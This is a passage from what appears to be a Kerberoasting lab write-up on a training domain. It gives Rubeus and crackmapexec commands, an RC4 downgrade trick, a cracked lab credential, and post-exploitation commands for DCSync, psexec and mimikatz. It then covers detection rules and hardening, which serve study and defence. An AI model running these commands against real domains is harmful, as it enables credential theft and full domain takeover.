$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQL_svc_dev/inlanefreight.local:[email protected]*$21CF6BFCE5377C1FA957FC340261E6A3$22AC9C6E64F19D4E51E849A99DC4FC4FCE819E376045D1310393C7D26A42FFE50607C42A5F5E038E30867855091726D5E21FC0C6C49730EA32CE8BF95EB6158D30796D016CCF6BA7E5A8825DECFBD9D619917BC9BF7B2A6E53380563DDC5BF24DDEE8B38D5F869DE6682BA2C762520434027485919F8F364F8B9D84B91C3D1EA8EECA64F5C9690276A6211F5CE6C4AEA57ADB06188BE5E538DAC82C3F7EE708188B3E4FD452C06FA41022317E97E9B840B93E4A03E7429D60FC4F8EB7546597B516695BDEB010CA3FEB5A25E36BEC787044DFB19117616D76DAE523248DF55DC2513C05788B27BCE31A3FF38E820F63BB491ECCA2563799C9C4563576B22EEB703E09B68AA95EC50CD234BFDF479027415A58C48D024611E281DDD9355FFBF02BA277B10D6D5D347BFB751FA6101FFE915A<SNIP>
```

**Analysis:**

Rubeus found 6 Kerberoastable users, automatically excluding disabled accounts and the krbtgt account via its LDAP filter. The `/nowrap` flag prevents line wrapping of the hash output — essential for clean file export. The LDAP filter used is displayed in the output: `samAccountType=805306368` (user accounts) with `!samAccountName=krbtgt` and not disabled.

**Supported ETypes: RC4_HMAC_DEFAULT** — this account uses RC4, producing a `$krb5tgs$23$*` hash directly crackable with hashcat mode 13100.

### Method 5B — Force RC4 Downgrade for AES-Enabled Accounts

If an account returns `$krb5tgs$17$*` or `$krb5tgs$18$*` (AES), attempt a downgrade:

```cmd
C:\Tools> Rubeus.exe kerberoast /tgtdeleg /nowrap
```

**Analysis:** `/tgtdeleg` modifies the TGS-REQ to request an RC4-encrypted ticket even when the account supports AES. This works in domains where RC4 is still available as a backward-compatibility option. If successful, the returned hash starts with `$krb5tgs$23$*` — significantly faster to crack.

### Method 5C — Targeted Kerberoast with Output File

```cmd
C:\Tools> Rubeus.exe kerberoast /user:sqldev /outfile:sqldev_hash.txt /nowrap
```

### Method 5D — Statistics Without Ticket Requests (/stats)

```cmd
C:\Tools> Rubeus.exe kerberoast /stats
```

**Analysis:** The `/stats` flag returns statistics about Kerberoastable accounts — count, encryption types, password ages — without requesting any TGS tickets. This is a stealthier reconnaissance option when you want to assess feasibility before triggering ticket requests that generate Event ID 4769.

---

## RC4 vs AES Encryption

| Metric                 | RC4 (etype 23)        | AES-128 (etype 17)   | AES-256 (etype 18)   |
|------------------------|-----------------------|----------------------|----------------------|
| Hash prefix            | `$krb5tgs$23$*`       | `$krb5tgs$17$*`      | `$krb5tgs$18$*`      |
| Hashcat mode           | 13100                 | 19600                | 19700                |
| Relative crack speed   | Fastest               | ~8x slower           | ~16x slower          |
| Detection signal       | Lower per request     | Lower per request    | Lower per request    |
| Configured by          | msDS-SupportedEncryptionTypes = 0 or 4 | = 8 | = 16 |

**Identifying RC4 vs AES accounts before requesting:**

```powershell
PS C:\Tools> Get-DomainUser -SPN | Select-Object samaccountname,msds-supportedencryptiontypes
```

```
samaccountname          msds-supportedencryptiontypes
--------------          -----------------------------
krbtgt                  0
sqldev                  0                              <- 0 = RC4 by default
sqlprod                 24                             <- 24 = AES-128 + AES-256
```

`msds-SupportedEncryptionTypes = 0` defaults to RC4. Values of 8 (AES-128), 16 (AES-256), or 24 (both AES) indicate AES-only accounts — attempt `/tgtdeleg` to force downgrade.

---

## Post-Crack Validation

```bash
Hackerpatel007_1@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

```
SMB         172.16.5.5      445    ACADEMY-EA-DC01 [*] Windows 10.0 Build
17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL)
(signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01 [+]
INLANEFREIGHT.LOCAL\sqldev:database! (Pwn3d!)
```

**`(Pwn3d!)`** — Domain Admin rights confirmed. `sqldev` is a member of Domain Admins; from here the full domain is compromised.

**Post-exploitation paths from sqldev:**

| Action                        | Tool                                      |
|-------------------------------|-------------------------------------------|
| Remote code execution on DC   | `psexec.py INLANEFREIGHT.LOCAL/sqldev:database!@172.16.5.5` |
| DCSync / dump domain hashes   | `secretsdump.py INLANEFREIGHT.LOCAL/sqldev:database!@172.16.5.5` |
| Dump NTDS.dit                 | Mimikatz `lsadump::dcsync /all /csv`      |
| Golden Ticket generation      | Mimikatz (requires krbtgt hash from DCSync) |
| BloodHound full collection    | `bloodhound-python -u sqldev -p database! -d inlanefreight.local -c all -ns 172.16.5.5` |

---

## Detection Engineering

### Windows Event IDs

| Event ID | Source          | Trigger                                        | Kerberoasting Indicator                                  |
|----------|-----------------|------------------------------------------------|----------------------------------------------------------|
| **4769** | Security (DC)   | Kerberos Service Ticket (TGS) requested        | Ticket encryption type 0x17 (RC4) is the primary signal  |
| **4770** | Security (DC)   | Kerberos Service Ticket renewed                | Unusual if many renewals in short window                 |
| **4624** | Security        | Account logon (Type 3 = network)               | Post-crack access from new source IP                     |
| **4672** | Security        | Special privileges assigned at logon           | DA-level access from cracked service account             |

### Key Detection Rule — Event ID 4769 + RC4

The most reliable detection indicator: **Event ID 4769 with Ticket Encryption Type = 0x17 (RC4-HMAC)**.

Modern domains enforcing AES will very rarely issue RC4 TGS tickets. A burst of 4769 events requesting RC4 tickets for service accounts from a single source IP is a high-fidelity Kerberoasting indicator.

```
Alert condition:
  Event_ID: 4769
  Ticket_Encryption_Type: 0x17 (RC4-HMAC)
  Service_Name: NOT "$" suffix (not machine accounts)
  Source_IP: single IP
  Count: > 5 within 10 minutes
  Action: Alert "Potential Kerberoasting — RC4 TGS Ticket Flood"
```

**Why RC4 is the flag:**

In domains that have enforced AES-only Kerberos (via `msDS-SupportedEncryptionTypes`), legitimate service access uses AES tickets. An RC4 ticket request for such an account either means the client is legacy or an attacker is using GetUserSPNs/Rubeus. The combination of multiple RC4 TGS requests from a single IP within a short window is high-confidence Kerberoasting.

---

## Defensive Hardening

| Control                                   | Implementation                                                                        |
|-------------------------------------------|---------------------------------------------------------------------------------------|
| **Service Account Password Length**       | Minimum 25–30 characters for all SPN-bearing user accounts                            |
| **Managed Service Accounts (MSAs)**       | Use gMSA (Group Managed Service Accounts) — auto-rotating 120-char passwords         |
| **AES-Only Encryption Enforcement**       | Set `msDS-SupportedEncryptionTypes = 24` (AES-128+AES-256) on all service accounts   |
| **Disable RC4 Domain-Wide**               | Group Policy → Computer Configuration → Security → Network Security → Kerberos cipher suites |
| **Privileged Account Tiering**            | Service accounts must NOT be members of Domain Admins, Enterprise Admins, etc.        |
| **Kerberoasting Detection (SIEM)**        | Alert on Event ID 4769 with EncType=0x17 from a single source, multiple targets       |
| **Honey Accounts**                        | Create a fake high-value SPN user account — any TGS request against it fires an alert |
| **Regular SPN Audit**                     | Quarterly review: `Get-DomainUser -SPN | Select-Object samaccountname,memberof`     |
| **Password Rotation Policy**              | Service account passwords must rotate at minimum every 90 days                        |

**GPO: Enforce AES-Only Kerberos**

```
Computer Configuration → Windows Settings → Security Settings →
Local Policies → Security Options →
  Network security: Configure encryption types allowed for Kerberos →
    Uncheck: DES, RC4
    Check: AES 128-bit, AES 256-bit, Future encryption types
```

---

## References

- MITRE ATT&CK T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting: https://attack.mitre.org/techniques/T1558/003/
- HTB Academy — Active Directory Enumeration & Attacks
- HTB Academy — Kerberos Attacks Module
- Impacket GetUserSPNs.py: https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py
- Rubeus: https://github.com/GhostPack/Rubeus
- PowerView: https://github.com/PowerShellMafia/PowerSploit
- Hashcat mode 13100 (Kerberos 5 TGS-REP etype 23): https://hashcat.net/wiki/doku.php?id=hashcat
- gMSA Documentation: https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview
- Tim Medin — Kerberoasting without Mimikatz (DerbyCon 2014): https://www.youtube.com/watch?v=PUyhlN-E5MU
